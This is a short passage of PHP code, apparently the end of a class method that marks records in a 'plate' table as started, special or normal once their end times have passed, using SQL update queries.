                if($row['plate_time_end'] < date("Y-m-d H:i:s")){
                    $this->query("update plate set is_plate_start=1 where plate_num=".$row['plate_num']);
                }
                if($row['special_time_end'] < date("Y-m-d H:i:s")){
                    $this->query("update plate set is_special=1 where plate_num=".$row['plate_num']);
                }
                if($row['normal_time_end'] < date("Y-m-d H:i:s")){
                    $this->query("update plate set is_normal=1 where plate_num=".$row['plate_num']);
                }
            }
        }
} 
?>